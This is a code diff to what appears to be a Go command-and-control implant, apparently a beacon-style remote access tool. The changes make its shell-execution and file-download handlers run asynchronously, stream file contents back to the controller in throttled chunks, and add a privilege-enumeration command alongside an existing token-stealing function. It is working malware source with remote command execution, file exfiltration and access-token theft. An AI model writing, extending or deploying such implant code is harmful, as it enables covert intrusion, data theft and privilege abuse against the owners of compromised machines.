@@ -21,14 +21,25 @@ func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	var result []byte
+	//var result []byte
 	if shellPath == "" && runtime.GOOS == "windows" {
-		result, err = packet.Run(shellBuf, Token)
-		return result, err
+		go func() {
+			_, err = packet.Run(shellBuf, Token)
+			if err != nil {
+				packet.ErrorProcess(err)
+			}
+			return
+		}()
 	} else {
-		result, err = packet.Shell(shellPath, shellBuf, Token)
-		return result, err
+		go func() {
+			_, err = packet.Shell(shellPath, shellBuf, Token)
+			if err != nil {
+				packet.ErrorProcess(err)
+			}
+			return
+		}()
 	}
+	return []byte("[+] command is executing"), nil
 }
 
 func CmdUploadStart(cmdBuf []byte) ([]byte, error) {
@@ -55,39 +66,44 @@ func CmdDownload(cmdBuf []byte) ([]byte, error) {
 	filePath := cmdBuf
 	strFilePath := string(filePath)
 	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
-	fileInfo, err := os.Stat(strFilePath)
-	if err != nil {
-		return nil, err
-	}
-	fileLen := fileInfo.Size()
-	test := int(fileLen)
-	fileLenBytes := packet.WriteInt(test)
-	requestID := crypt.RandomInt(10000, 99999)
-	requestIDBytes := packet.WriteInt(requestID)
-	result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
-	packet.DataProcess(2, result)
-
-	fileHandle, err := os.Open(strFilePath)
-	if err != nil {
-		return nil, err
-	}
-	var fileContent []byte
-	fileBuf := make([]byte, 1024*1024)
-	for {
-		n, err := fileHandle.Read(fileBuf)
-		if err != nil && err != io.EOF {
-			break
+	go func() {
+		fileInfo, err := os.Stat(strFilePath)
+		if err != nil {
+			packet.ErrorProcess(err)
+			return
 		}
-		if n == 0 {
-			break
-		}
-		fileContent = fileBuf[:n]
-		result = util.BytesCombine(requestIDBytes, fileContent)
-		packet.DataProcess(8, result)
-	}
-	packet.DataProcess(9, requestIDBytes)
-	return []byte("Download " + strFilePath + " success"), nil
+		fileLen := fileInfo.Size()
+		test := int(fileLen)
+		fileLenBytes := packet.WriteInt(test)
+		requestID := crypt.RandomInt(10000, 99999)
+		requestIDBytes := packet.WriteInt(requestID)
+		result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
+		packet.DataProcess(2, result)
 
+		fileHandle, err := os.Open(strFilePath)
+		if err != nil {
+			packet.ErrorProcess(err)
+			return
+		}
+		var fileContent []byte
+		fileBuf := make([]byte, 1024*1024)
+		for {
+			n, err := fileHandle.Read(fileBuf)
+			if err != nil && err != io.EOF {
+				break
+			}
+			if n == 0 {
+				break
+			}
+			fileContent = fileBuf[:n]
+			result = util.BytesCombine(requestIDBytes, fileContent)
+			packet.DataProcess(8, result)
+			time.Sleep(50 * time.Millisecond)
+		}
+		packet.DataProcess(9, requestIDBytes)
+	}()
+
+	return []byte("[+] Downloading " + strFilePath), nil
 }
 
 func CmdFileBrowse(cmdBuf []byte) ([]byte, error) {
@@ -135,6 +151,20 @@ func CmdExecute(cmdBuf []byte, Token uintptr) ([]byte, error) {
 
 func CmdGetUid() ([]byte, error) {
 	return packet.GetUid()
+}
+
+func CmdGetPrivs(b []byte, token uintptr) ([]byte, error) {
+	privCnt := int(packet.ReadShort(b[:2]))
+	buf := bytes.NewBuffer(b[2:])
+	privs := make([]string, privCnt)
+	for i := 0; i < privCnt; i++ {
+		tmp, err := util.ParseAnArg(buf)
+		if err != nil {
+			return nil, err
+		}
+		privs[i] = string(tmp)
+	}
+	return packet.GetPrivs(privs, token)
 }
 
 func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error) {
